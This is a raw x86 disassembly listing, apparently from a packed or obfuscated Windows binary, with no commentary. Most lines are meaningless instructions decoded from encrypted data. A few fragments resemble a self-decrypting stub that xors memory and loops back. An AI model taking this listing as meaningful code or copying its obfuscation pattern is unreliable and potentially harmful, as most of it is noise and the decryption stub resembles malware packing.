  40b89c:	(bad)  [ebx+eiz*4-0x40]
  40b8a0:	dec    esi
  40b8a1:	sbb    ecx,DWORD PTR [esp+ebp*8-0x2eb588d2]
  40b8a8:	inc    ecx
  40b8a9:	ss mov edx,0x9118cb8c
  40b8af:	fidiv  DWORD PTR [esi]
  40b8b1:	outs   dx,BYTE PTR ds:[esi]
  40b8b2:	(bad)  
  40b8b3:	mov    ah,0xd3
  40b8b5:	out    dx,eax
  40b8b6:	shr    DWORD PTR [edi],0xa3
  40b8b9:	ss dec ebp
  40b8bb:	das    
  40b8bc:	mov    eax,ds:0x61fc3fce
  40b8c1:	das    
  40b8c2:	ins    DWORD PTR es:[edi],dx
  40b8c3:	(bad)  [esi+0x54]
  40b8c6:	or     DWORD PTR [esi],esi
  40b8c8:	mov    dh,0xe0
  40b8ca:	mov    esi,0x2713d0f8
  40b8cf:	inc    ebx
  40b8d0:	std    
  40b8d1:	adc    BYTE PTR ds:0x2be4391,bl
  40b8d7:	jp     0x40b866
  40b8d9:	test   eax,0xaaeec704
  40b8de:	in     eax,0x23
  40b8e0:	add    BYTE PTR [esi],cl
  40b8e2:	in     eax,dx
  40b8e3:	mov    edi,0xf0217e98
  40b8e8:	fnstsw WORD PTR [ebx+esi*4-0x36]
  40b8ec:	jmp    0x4997:0x777e9074
  40b8f3:	ficom  WORD PTR [edx+edi*4-0x36fb8095]
  40b8fa:	pop    edx
  40b8fb:	cmp    DWORD PTR [ebx+0x4d020c8b],esp
  40b901:	repz adc DWORD PTR [ebp+0x2fe46c5],0xfffffff8
  40b909:	cmp    al,0xfe
  40b90b:	sbb    al,0x1c
  40b90d:	rcr    DWORD PTR [esi],0x88
  40b910:	pop    ebx
  40b911:	cmc    
  40b912:	aad    0x88
  40b914:	cmp    eax,0x7b31a8c6
  40b919:	je     0x40bc46
  40b91f:	mov    eax,DWORD PTR [ebp-0x10]
  40b922:	and    DWORD PTR [eax],0x751c80
  40b928:	jmp    0x40b5e7
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	shl    DWORD PTR [ebx],cl
  40b93f:	pop    esp
  40b940:	xchg   BYTE PTR [ecx-0x3a],ch
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	jmp    0x4da0e17a
  40b94f:	idiv   BYTE PTR [edi]
  40b951:	pop    eax
  40b952:	shl    BYTE PTR [ecx],cl
  40b954:	pop    edi
  40b955:	aam    0x21
  40b957:	jl     0x6a6b9ec8
  40b95d:	popf   
  40b95e:	jne    0x40b8f5
  40b960:	jp     0x40b981
  40b962:	fsubr  QWORD PTR [eax-0x38]
  40b965:	lahf   
  40b966:	inc    eax
  40b967:	or     ah,BYTE PTR [edi+0x1f9a543]
  40b96d:	inc    esi
  40b96e:	cmp    eax,0xbe8c98b3
  40b973:	shr    DWORD PTR [esi+0xbff3bb4],cl
  40b979:	cmp    DWORD PTR [eax+0x14e44a7c],eax
  40b97f:	out    0x88,al
  40b981:	aad    0xe
  40b983:	addr16 mov eax,0xe38aa0e
  40b989:	add    DWORD PTR [edx],esi
  40b98b:	in     al,dx
  40b98c:	std    
  40b98d:	ins    BYTE PTR es:[edi],dx
  40b98e:	cld    
  40b98f:	mov    BYTE PTR [ecx+esi*2+0x43],ch
  40b993:	push   es
  40b994:	test   BYTE PTR [ecx+0x1600b1aa],dh
  40b99a:	cwde   
  40b99b:	je     0x40b99a
  40b99d:	fst    DWORD PTR [ebx+ecx*8]
  40b9a0:	mov    al,0x19
  40b9a2:	dec    eax
  40b9a3:	inc    eax
  40b9a4:	mov    gs:0xcb35f797,al
  40b9aa:	aam    0x14
  40b9ac:	aam    0x4f
  40b9ae:	jbe    0x40ba08
  40b9b0:	push   edi
  40b9b1:	inc    ecx
  40b9b2:	inc    edi
  40b9b3:	xor    DWORD PTR [ebx],edi
  40b9b5:	pop    ss
  40b9b6:	aas    
  40b9b7:	adc    BYTE PTR [esi+0x10a0d1f2],0x44
  40b9be:	sub    dl,BYTE PTR [ebx-0x36c2ab9e]
  40b9c4:	mov    cl,0x11
  40b9c6:	sbb    al,0xac
  40b9c8:	gs adc al,0x18
  40b9cb:	shr    DWORD PTR [edi-0x7e],0x79
  40b9cf:	jg     0x40ba06
  40b9d1:	(bad)  
  40b9d2:	imul   ebp,DWORD PTR [ebp-0x2e],0x59c24f4d
  40b9d9:	cmp    eax,DWORD PTR [ecx+esi*4]
  40b9dc:	pop    esi
  40b9dd:	out    0xbc,eax
  40b9df:	dec    eax
  40b9e0:	aas    
  40b9e1:	mov    ecx,0x1928e999
  40b9e6:	clc    
  40b9e7:	arpl   WORD PTR [esp+ebx*1+0x2a47dc15],sp
  40b9ee:	pop    es
  40b9ef:	push   es
  40b9f0:	pop    eax
  40b9f1:	pop    es
  40b9f2:	push   es
  40b9f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9f4:	dec    edx
  40b9f5:	std    
  40b9f6:	adc    bh,BYTE PTR [eax-0x575ae897]
  40b9fc:	aaa    
  40b9fd:	or     DWORD PTR [eax+0x46],0xffffff9f
  40ba01:	xchg   DWORD PTR [edx+0x15],ebp
  40ba04:	dec    ebp
  40ba05:	pop    esi
  40ba06:	cmp    eax,0xdb28da3e
  40ba0b:	and    al,0x2b
  40ba0d:	aas    
  40ba0e:	mov    ds:0x3f6aa58d,al
  40ba13:	fwait
  40ba14:	iret   
  40ba15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba16:	mov    dh,0x3b
  40ba18:	inc    esi
  40ba19:	mov    DWORD PTR [ebp+0x65f80e60],ebp
  40ba1f:	fs adc eax,0xff606ac3
  40ba25:	or     eax,0x2bfc70c4
  40ba2a:	mov    dl,0x91
  40ba2c:	call   FWORD PTR cs:[ebp+ebx*8-0x51dde43c]
  40ba34:	nop
  40ba35:	ret    
  40ba36:	jb     0x40ba80
  40ba38:	push   edx
  40ba39:	adc    BYTE PTR [ecx],bl
  40ba3b:	and    al,0x2c
  40ba3d:	ins    DWORD PTR es:[edi],dx
  40ba3e:	inc    edi
  40ba3f:	cli    
  40ba40:	sub    ebp,0xd8cccea0
  40ba46:	(bad)  
  40ba47:	adc    ah,BYTE PTR [edx+esi*1-0x476af42c]
  40ba4e:	jmp    0x53845d2
  40ba53:	push   0xc5d56f7
  40ba58:	fsub   st,st(3)
  40ba5a:	xchg   esi,eax
  40ba5b:	mov    dl,0xda
  40ba5d:	(bad)  
  40ba5e:	adc    DWORD PTR [edx+0xb],eax
  40ba61:	ror    DWORD PTR [eax],cl
  40ba63:	neg    BYTE PTR [eax]
  40ba65:	sbb    eax,0xa730f021
  40ba6a:	pushf  
  40ba6b:	inc    edx
  40ba6d:	icebp  
  40ba6e:	adc    BYTE PTR [edx+0x3c],bl
  40ba71:	in     eax,dx
  40ba72:	dec    edi
  40ba73:	loop   0x40ba8c
  40ba75:	xchg   esp,eax
  40ba76:	dec    ecx
  40ba77:	sbb    esi,DWORD PTR [ebx+0x5f029849]
  40ba7d:	xchg   ecx,eax
  40ba7e:	popa   
  40ba7f:	fidivr DWORD PTR [eax+0x66]
  40ba82:	mov    bl,0x15
  40ba84:	mov    eax,0x51e962fe
  40ba89:	aam    0xa3
  40ba8b:	push   ds
  40ba8c:	leave  
  40ba8d:	repnz retf 0x573a
  40ba91:	stc    
  40ba92:	ret    0x2ad9
  40ba95:	imul   DWORD PTR [ebp-0x6f9b579d]
  40ba9b:	add    cl,bl
  40ba9d:	inc    ecx
  40ba9e:	sbb    al,0xce
  40baa1:	neg    DWORD PTR [eax+0x2c]
  40baa4:	adc    BYTE PTR [ecx+0x550e9650],cl
  40baaa:	out    0x4c,al
  40baac:	sbb    bl,BYTE PTR [ecx]
  40baae:	cdq    
  40baaf:	test   BYTE PTR [ecx-0x2d7b79d1],ch
  40bab5:	xchg   esi,eax
  40bab6:	and    BYTE PTR [edi],dh
  40bab8:	adc    eax,0xf9454625
  40babd:	sbb    al,0xb4
  40babf:	(bad)
  40bac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bac3:	repz iret 
  40bac5:	pop    ds
  40bac6:	jmp    ebx
  40bac8:	sub    ebp,eax
  40baca:	add    edi,ebp
  40bacc:	inc    BYTE PTR [eax]
  40bace:	cmc    
  40bacf:	enter  0x83e0,0xd2
  40bad3:	pop    esp
  40bad4:	cli    
  40bad5:	xchg   edi,eax
  40bad6:	adc    eax,esp
  40bad8:	pop    ds
  40bad9:	pop    edi
  40bada:	adc    eax,0x7f45234e
  40badf:	stc    
  40bae0:	pop    eax
  40bae1:	and    esp,DWORD PTR [eax]
  40bae3:	ds inc edx
  40bae5:	pop    edx
  40bae6:	dec    bp
  40bae8:	retf   
  40bae9:	push   0xffffff9e
  40baeb:	stc    
  40baec:	xor    DWORD PTR ds:0x6d8c8d93,eax
  40baf2:	lock jb 0x40bac5
  40baf5:	out    0x2f,al
  40baf7:	sbb    esp,DWORD PTR [ebp+0x45]
  40bafa:	cmp    BYTE PTR [edi-0x2],dl
  40bafd:	push   edx
  40bafe:	test   eax,0xa0521bd4
  40bb03:	mov    ebp,0x6043d48a
  40bb08:	and    dl,BYTE PTR [edx+0x5e9f0847]
  40bb0e:	inc    BYTE PTR [ebp-0x76c6b201]
  40bb14:	inc    edx
  40bb15:	mov    al,0x5e
  40bb17:	add    eax,0x2e604df7
  40bb1c:	repz icebp 
  40bb1e:	mov    ds:0xf422d090,al
  40bb23:	sbb    ch,BYTE PTR [ebp-0x67d64497]
  40bb29:	call   0xdfdf3abd
  40bb2e:	jmp    0x40bab6
  40bb30:	adc    eax,0x7dac47cc
  40bb35:	jmp    0xda8:0xdf15b28
  40bb3c:	loope  0x40baf7
  40bb3e:	xor    eax,0x8e130603
  40bb43:	cmp    esp,DWORD PTR [esi+0x3]
  40bb46:	sub    DWORD PTR [ecx+0x6a4dd827],ecx
  40bb4c:	rcl    DWORD PTR [ecx+edi*1],cl
  40bb4f:	mov    DWORD PTR [edi],esi
  40bb51:	pop    edi
  40bb52:	mov    fs,esp
  40bb54:	and    ch,al
  40bb56:	inc    eax
  40bb57:	test   al,0x1e
  40bb59:	lea    edi,[ebx+0x35]
  40bb5c:	mov    esp,0x709cd949
  40bb61:	mov    bh,0x39
  40bb63:	mov    ?,ebp
  40bb65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb66:	sub    DWORD PTR ds:0x2e0884fb,esi
  40bb6c:	pop    ecx
  40bb6d:	sti    
  40bb6e:	inc    ebp
  40bb6f:	xchg   ebp,eax
  40bb70:	imul   edx,DWORD PTR es:[ebp-0x27],0x1d
  40bb75:	ds cdq 
  40bb77:	xor    DWORD PTR [edi],0xab7b4727
  40bb7d:	add    al,dl
  40bb7f:	mov    bh,0x9e
  40bb81:	pop    ebx
  40bb82:	dec    ebp
  40bb83:	jge    0x40bb67
  40bb85:	pop    esp
  40bb86:	adc    DWORD PTR [eax],0xffffffeb
  40bb89:	inc    edx
  40bb8a:	data16 icebp 
  40bb8c:	ret    
  40bb8d:	mov    ds:0x5858132b,al
  40bb92:	ss inc ebp
  40bb94:	jbe    0x40bb5e
  40bb96:	out    dx,eax
  40bb97:	sahf   
  40bb98:	lods   eax,DWORD PTR ds:[esi]
  40bb99:	repz inc ebx
  40bb9b:	js     0x40bb59
  40bb9d:	mov    esi,0xd3a4e8af
  40bba2:	(bad)  
  40bba3:	mov    al,0x4c
  40bba5:	fwait
  40bba6:	scas   al,BYTE PTR es:[edi]
  40bba7:	add    BYTE PTR [edx+ebx*4+0x7a],bh
  40bbab:	add    DWORD PTR [esi+0x54011bfe],0xa290a859
  40bbb5:	dec    edi
  40bbb6:	cmp    eax,0xd4286fca
  40bbbb:	call   0xc820:0x8e716265
  40bbc2:	bound  ecx,QWORD PTR [ebx+0xb]
  40bbc5:	push   ebp
  40bbc6:	and    BYTE PTR [edi],0xc2
  40bbc9:	pop    esp
  40bbca:	stc    
  40bbcb:	inc    ebp
  40bbcc:	test   BYTE PTR [edx+0x32f5909b],ah
  40bbd2:	jno    0x40bc24
  40bbd4:	jle    0x40bbfc
  40bbd6:	add    edx,DWORD PTR [ebp-0x1c]
  40bbd9:	mov    ds:0xd837bbc3,al
  40bbde:	or     ch,al
  40bbe0:	adc    BYTE PTR [edi-0x4c9c2e7d],bl
  40bbe6:	inc    eax
  40bbe7:	out    dx,eax
  40bbe8:	xchg   esp,eax
  40bbe9:	xchg   ebp,eax
  40bbea:	bound  ebx,QWORD PTR [edi-0x2bfdaaf6]
  40bbf0:	and    eax,edi
  40bbf2:	dec    esp
  40bbf3:	and    ebp,ebp
  40bbf5:	inc    esi
  40bbf6:	and    al,0xa
  40bbf8:	sbb    edi,DWORD PTR [ebx+0x2076c24b]
  40bbfe:	pop    edi
  40bbff:	push   esi
  40bc00:	add    al,0xe4
  40bc02:	ins    DWORD PTR es:[edi],dx
  40bc03:	pusha  
  40bc04:	jo     0x40bc18
  40bc06:	inc    edi
  40bc07:	xor    BYTE PTR [eax+0x6f],dl
  40bc0a:	jbe    0x40bc42
  40bc0c:	dec    edi
  40bc0d:	jae    0x40bbdb
  40bc0f:	xchg   edi,eax
  40bc10:	mov    eax,DWORD PTR [ecx+eiz*1-0x26f1e8db]
  40bc17:	pop    ecx
  40bc18:	sub    DWORD PTR [ebx+esi*2-0x5a16b40f],esi
  40bc1f:	ret    
  40bc20:	push   es
  40bc21:	jb     0x40bbe4
  40bc23:	sub    ebx,0xd726ee7f
  40bc29:	mov    esi,0xac0f3212
  40bc2e:	aad    0xbf
  40bc30:	aad    0x54
  40bc32:	(bad)  
  40bc33:	push   edi
  40bc34:	add    DWORD PTR [ebx-0x23],ebp
  40bc37:	inc    ebx
  40bc38:	and    esi,eax
  40bc3a:	out    dx,al
  40bc3b:	imul   ebp,DWORD PTR [edx+0xebd4a4f],0x77
  40bc42:	mov    bh,0xdb
  40bc44:	and    eax,0xf4458b94
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc16
  40bc7d:	and    BYTE PTR [edi+ebx*8],dl
  40bc80:	ret    0x7891
  40bc83:	js     0x40bcf9
  40bc85:	jle    0x40bcff
  40bc87:	js     0x40bca0
  40bc89:	mov    bh,BYTE PTR [ebp+0x72]
  40bc8c:	stos   WORD PTR es:[edi],ax
  40bc8e:	sahf   
  40bc8f:	lock mov ds:0xd63ae3f4,al
  40bc95:	inc    edi
  40bc96:	mov    esi,0xed17e39b
  40bc9b:	imul   edx,DWORD PTR [ebx+0x3f],0x69
  40bc9f:	sbb    BYTE PTR [esi+0x5c],dl
  40bca2:	mov    ecx,0x78790b03
  40bca7:	or     ah,ah
  40bca9:	mov    al,0x5f
  40bcab:	adc    BYTE PTR [esi+ebx*4],dh
  40bcae:	push   ecx
  40bcaf:	add    esp,DWORD PTR [eax]
  40bcb1:	jo     0x40bc33
  40bcb3:	xchg   ecx,eax
  40bcb4:	jp     0x40bce5
  40bcb6:	xor    al,0xf0
  40bcb8:	jl     0x40bccd
  40bcba:	pop    esi
  40bcbb:	dec    esi
  40bcbc:	nop
  40bcbd:	xchg   ebp,eax
  40bcbe:	sti    
  40bcbf:	aaa    
  40bcc0:	leave  
  40bcc1:	and    eax,0x4d68642c
  40bcc6:	inc    eax
  40bcc7:	xor    ch,al
  40bcc9:	into   
  40bcca:	leave  
  40bccb:	inc    ebp
  40bccc:	pop    esp
  40bccd:	clc    
  40bcce:	or     eax,0x2a1e8b67
  40bcd3:	in     eax,0x86
  40bcd5:	inc    ebp
  40bcd6:	dec    ebx
  40bcd7:	lss    ebx,FWORD PTR [edx]
  40bcda:	xchg   esp,eax
  40bcdb:	js     0x40bcfa
  40bcdd:	clc    
  40bcde:	jb     0x40bc60
  40bce0:	cld    
  40bce1:	(bad)  
  40bce3:	(bad)  
  40bce4:	aam    0xf8
  40bce6:	xor    bl,BYTE PTR [edx-0x29ed43b5]
  40bcec:	jl     0x40bd0a
  40bcee:	(bad)  
  40bcef:	(bad)  
  40bcf1:	xchg   ebp,eax
  40bcf2:	nop
  40bcf3:	mov    esp,ebp
  40bcf5:	retf   
  40bcf6:	ins    DWORD PTR es:[edi],dx
  40bcf7:	stos   DWORD PTR es:[edi],eax
  40bcf8:	retf   0x9c44
  40bcfb:	push   cs
  40bcfc:	in     eax,0xa3
  40bcfe:	pop    esp
  40bcff:	jg     0x40bd60
  40bd01:	(bad)  
  40bd02:	std    
  40bd03:	data16 (bad) 
  40bd05:	ss mov esp,0xad296c38
  40bd0b:	loope  0x40bd0d
  40bd0d:	and    DWORD PTR [ecx-0x5bd5b856],esp
  40bd13:	mov    ah,0xd7
  40bd15:	inc    edx
  40bd16:	xor    dl,BYTE PTR [ebp-0x3d]
  40bd19:	je     0x40bd9a
  40bd1b:	lea    edx,[edi+0x77]
  40bd1e:	lods   al,BYTE PTR ds:[esi]
  40bd1f:	out    0xdc,al
  40bd21:	pop    ebp
  40bd22:	jecxz  0x40bd38
  40bd24:	les    esi,FWORD PTR [ecx-0x7a598387]
  40bd2a:	jmp    0x5adc:0x1aabc5ef
  40bd31:	sub    cl,BYTE PTR ds:0xf440a181
  40bd37:	shl    edi,0x5d
  40bd3a:	enter  0xbfaa,0x41
  40bd3e:	add    al,BYTE PTR [ebp-0x367439bc]
  40bd44:	test   al,0x41
  40bd46:	xor    ecx,DWORD PTR [esi+0x7e]
  40bd49:	fmul   DWORD PTR [ecx+0x4359f074]
  40bd4f:	inc    eax
  40bd50:	in     eax,0xe5
  40bd52:	mov    ds:0x8d6f46b7,al
  40bd57:	into   
  40bd58:	pop    es
  40bd59:	sub    al,0xb2
  40bd5b:	pop    ebx
  40bd5c:	in     eax,0x4
  40bd5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd5f:	ret    0x3198
  40bd62:	and    DWORD PTR [ebp-0x7b46148f],ebx
  40bd68:	jae    0x40bcfa
  40bd6a:	(bad)  
  40bd6b:	test   DWORD PTR [ecx-0x1d],0xd392d83f
  40bd72:	sub    eax,0x59e72c9a
  40bd77:	or     BYTE PTR [esi-0x1118b415],bl
  40bd7d:	or     cl,bl
  40bd7f:	arpl   di,bx
  40bd81:	push   esp
  40bd82:	push   ss
  40bd83:	stc    
  40bd84:	and    edx,eax
  40bd86:	sbb    eax,0x49148696
  40bd8b:	pop    ebp
  40bd8c:	mov    ecx,0x4119d13f
  40bd91:	out    dx,eax
  40bd92:	ss jnp 0x40bd68
  40bd95:	xchg   esi,eax
  40bd96:	(bad)  
  40bd97:	push   0xffffffda
  40bd99:	jnp    0x40bd26
  40bd9b:	pop    esi
  40bd9c:	sar    BYTE PTR [ebp+0x7],0xc
  40bda0:	pop    esi
  40bda1:	sbb    al,0x83
  40bda3:	xor    eax,0xa129ca5
  40bda8:	int3   
  40bda9:	cmp    al,0xa5
  40bdab:	jl     0x40bd30
  40bdad:	mov    bh,0x59
  40bdaf:	int    0xab
  40bdb1:	xor    eax,0xef1bd90
  40bdb6:	pop    ebx
  40bdb7:	pop    ds
  40bdb8:	pop    esp
  40bdb9:	retf   
  40bdba:	add    al,0xd8
  40bdbc:	push   edi
  40bdbd:	cwde   
  40bdbe:	or     ecx,esp
  40bdc0:	in     al,0x8b
  40bdc2:	cmp    edx,DWORD PTR [edx-0xca50dbe]
  40bdc8:	push   eax
  40bdc9:	sub    BYTE PTR gs:[edx],dh
  40bdcc:	test   DWORD PTR [ecx-0x199d716a],0x596c5ff0
  40bdd6:	cmc    
  40bdd7:	hlt    
  40bdd8:	lahf   
  40bdd9:	gs sbb ebp,eax
  40bddc:	xchg   esp,eax
  40bddd:	xchg   ebx,eax
  40bdde:	loope  0x40be3a
  40bde0:	outs   dx,BYTE PTR ds:[esi]
  40bde1:	pop    edx
  40bde2:	loope  0x40bdba
  40bde4:	(bad)  
  40bde5:	repz and eax,0xfb1a7f4d
  40bdeb:	inc    edi
  40bdec:	xchg   edi,eax
  40bded:	xchg   esp,eax
  40bdee:	push   cs
  40bdef:	out    dx,al
  40bdf0:	imul   ebp,DWORD PTR [ecx+0x789d69ec],0xffffffbe
  40bdf7:	ret    
  40bdf8:	push   esp
  40bdf9:	mov    BYTE PTR [edx],bh
  40bdfb:	jne    0x40bdc4
  40bdfd:	and    cl,dl
  40bdff:	sub    edx,DWORD PTR [edx+0x2]
  40be02:	sub    eax,0xbc901737
  40be07:	scas   al,BYTE PTR es:[edi]
  40be08:	out    0x50,eax
  40be0a:	sbb    DWORD PTR [edx+0x29060b83],0xec064c49
  40be14:	jnp    0x40bddf
  40be16:	fisubr WORD PTR [ebx]
  40be18:	xor    bl,BYTE PTR [esi]
  40be1a:	les    eax,FWORD PTR [ebx-0x73]
  40be1d:	repnz cli 
  40be1f:	sti    
  40be20:	in     al,dx
  40be21:	fwait
  40be22:	stos   BYTE PTR es:[edi],al
  40be23:	arpl   WORD PTR [ebx+0x56],dx
  40be26:	lods   eax,DWORD PTR ds:[esi]
  40be27:	shl    BYTE PTR [edx],0x69
  40be2a:	fdivr  QWORD PTR [esi+edx*2+0x2b21249c]
  40be31:	sbb    al,ah
  40be33:	mov    edx,0xc625977f
  40be38:	scas   eax,DWORD PTR es:[edi]
  40be39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be3a:	xchg   esi,eax
  40be3b:	pop    esp
  40be3c:	mov    ebx,0xe2f728ac
  40be41:	cmp    al,0x53
  40be43:	fxch   st(5)
  40be45:	clc    
  40be46:	in     eax,0xfe
  40be48:	test   DWORD PTR [edx],0x581e36bf
  40be4e:	jae    0x40bdfb
  40be50:	xchg   edx,eax
  40be51:	cmc    
  40be52:	jns    0x40bec0
  40be54:	imul   eax,DWORD PTR [eax-0x6e7fd0fd],0xc539f78
  40be5e:	mov    esi,0x905ee1d3
  40be63:	fidiv  DWORD PTR [edi]
  40be65:	imul   edi,DWORD PTR [ecx+0x520bf3a9],0x5a
  40be6c:	xor    al,0x1f
  40be6e:	jecxz  0x40be2b
  40be70:	mov    gs,WORD PTR [edx-0xb]
  40be73:	and    esp,DWORD PTR [edx+0x1f3566cf]
  40be79:	inc    ah
  40be7b:	bswap  edi
  40be7d:	outs   dx,DWORD PTR ds:[esi]
  40be7f:	add    ah,bl
  40be81:	cdq    
  40be82:	pop    ebx
  40be83:	mov    ah,0x37
  40be85:	lock pop edx
  40be87:	dec    esi
  40be88:	xchg   edx,eax
  40be89:	xchg   esi,eax
  40be8a:	imul   DWORD PTR [esp+esi*4+0x25bc0b72]
  40be91:	shr    BYTE PTR [ebx+0x6],0xa
  40be95:	push   0xf0bcb439
  40be9a:	push   0x90526476
  40be9f:	cld    
  40bea0:	fidiv  WORD PTR [ebx+0x24]
  40bea3:	push   edi
  40bea4:	or     dh,bl
  40bea6:	jge    0x40bed5
  40bea8:	push   ecx
  40bea9:	push   0x49c35b62
  40beae:	or     DWORD PTR [edx],eax
  40beb0:	retf   0xb34e
  40beb3:	ror    BYTE PTR [edi+0x7df9d3b6],cl
  40beb9:	pushf  
  40beba:	adc    eax,0x356e9a59
  40bebf:	push   ds
  40bec0:	pop    eax
  40bec1:	xor    eax,0x43e7ed8d
  40bec6:	push   esp
  40bec7:	retf   
  40bec8:	jp     0x40be81
  40beca:	xchg   esp,eax
  40becb:	jo     0x40be64
  40becd:	adc    ebp,ebp
  40becf:	aam    0x3d
  40bed1:	pop    esp
  40bed2:	sub    edi,DWORD PTR [ecx+ebp*2-0x2ecbbf83]
  40bed9:	push   ds
  40beda:	(bad)  
  40bedb:	push   cs
  40bedc:	mov    ebp,0xfb11361e
  40bee1:	icebp  
  40bee2:	repnz mov dl,0xd4
  40bee5:	xor    esi,ecx
  40bee7:	addr16 xchg edi,eax
  40bee9:	addr16 xor al,dh
  40beec:	int3   
  40beed:	call   0x3a70b37e
  40bef2:	mov    bl,0xd2
  40bef4:	add    DWORD PTR [ebp+0x76],ecx
  40bef7:	(bad)  
  40bef8:	xlat   BYTE PTR ds:[ebx]
  40bef9:	ins    DWORD PTR es:[edi],dx
  40befa:	or     esp,DWORD PTR [edi+0x6f163b81]
  40bf00:	inc    ebp
  40bf01:	addr16 inc ecx
  40bf03:	test   eax,0x9458812c
  40bf08:	and    dh,ah
  40bf0a:	aaa    
  40bf0b:	loop   0x40bebf
  40bf0d:	sub    ch,al
  40bf0f:	clc    
  40bf10:	(bad)  
  40bf11:	clc    
  40bf12:	cmp    bh,dh
  40bf14:	call   0xf7908248
  40bf19:	xor    BYTE PTR [esi+edx*4-0x4c],dl
  40bf1d:	jg     0x40bf37
  40bf1f:	xor    DWORD PTR [edi-0x1a],esp
  40bf22:	mov    al,0x8d
  40bf24:	scas   eax,DWORD PTR es:[edi]
  40bf25:	sbb    DWORD PTR [ebp-0x20],ecx
  40bf28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf29:	test   eax,0x222ec7c9
  40bf2e:	stos   DWORD PTR es:[edi],eax
  40bf2f:	shl    BYTE PTR [ecx],1
  40bf31:	je     0x40bf14
  40bf33:	add    BYTE PTR [ebx+0x5f],bh
  40bf36:	lds    esp,FWORD PTR [eax]
  40bf38:	push   ds
  40bf39:	pop    eax
  40bf3a:	xchg   edi,eax
  40bf3b:	dec    eax
  40bf3c:	and    edx,DWORD PTR [ebp+0x0]
  40bf3f:	pop    ecx
  40bf40:	out    dx,eax
  40bf41:	hlt    
  40bf42:	mov    bh,0xaf
  40bf44:	mov    BYTE PTR [eax+0x2ef65eca],dl
  40bf4a:	xchg   ebp,eax
  40bf4b:	xchg   esp,eax
  40bf4c:	xor    eax,0x99e941de
  40bf51:	mov    BYTE PTR [eax],bh
  40bf53:	inc    ebx
  40bf54:	inc    ebx
  40bf55:	int3   
  40bf56:	inc    eax
  40bf57:	sbb    ah,al
  40bf59:	loope  0x40bf5e
  40bf5b:	icebp  
  40bf5c:	xchg   esi,eax
  40bf5d:	lds    esp,FWORD PTR ds:0x9c392f4d
  40bf63:	xchg   ebp,eax
  40bf64:	inc    esp
  40bf65:	mov    edi,0xc5a0ec7e
  40bf6a:	jge    0x40bfeb
  40bf6c:	xchg   esi,eax
  40bf6d:	and    dl,bh
  40bf6f:	pop    es
  40bf70:	dec    ebp
  40bf71:	mov    ah,0x14
  40bf73:	push   es
  40bf74:	lahf   
  40bf75:	lock or DWORD PTR [eax+0x2b6c346f],ebx
  40bf7c:	bound  eax,QWORD PTR [ebp+0x1f]
  40bf7f:	test   BYTE PTR ds:0x8b7be88c,ah
  40bf85:	jge    0x40bf8f
  40bf87:	mov    edi,DWORD PTR [edi]
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	cmp    DWORD PTR [eax-0x69c1b457],eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	and    al,0xd5
  40bfcb:	add    DWORD PTR [ecx+0x548182cf],0x2d
  40bfd2:	jmp    0xaa75:0xbd10c3d
  40bfd9:	adc    eax,0x38a80514
  40bfde:	push   ss
  40bfdf:	shl    DWORD PTR [edi+0x5e150b2],0x75
  40bfe6:	jle    0x40bfeb
  40bfe8:	jmp    0x9aa0e034
  40bfed:	mov    dh,0x3d
  40bfef:	dec    ebp
  40bff0:	dec    ebp
  40bff1:	sbb    esp,DWORD PTR ds:0x11c19d38
  40bff7:	cmp    esp,ebp
  40bff9:	sbb    eax,0xc36b8fc7
  40bffe:	mov    ebx,0x5301df29
  40c003:	int3   
  40c004:	in     eax,dx
  40c005:	add    ebx,eax
  40c007:	add    eax,0xe5736e31
  40c00c:	push   ebp
  40c00d:	ficom  DWORD PTR [ecx+edx*2-0x71f51399]
  40c014:	(bad)  
  40c015:	xlat   BYTE PTR ds:[ebx]
  40c016:	push   esp
  40c017:	add    eax,0x1cac5e06
  40c01c:	and    eax,0xb8078bec
  40c021:	jge    0x40bfa3
  40c023:	xchg   ch,bl
  40c025:	popf   
  40c026:	sub    bh,BYTE PTR [ecx]
  40c028:	out    0x69,eax
  40c02a:	dec    ebp
  40c02b:	syscall 
  40c02d:	pop    ss
  40c02e:	jns    0x40c04a
  40c030:	repz adc DWORD PTR [ecx+0xd90508d],esp
  40c037:	sbb    eax,esp
  40c039:	push   esp
  40c03a:	sbb    BYTE PTR [ebx+0x5037d88c],bl
  40c040:	icebp  
  40c041:	mov    ebx,fs
  40c043:	cdq    
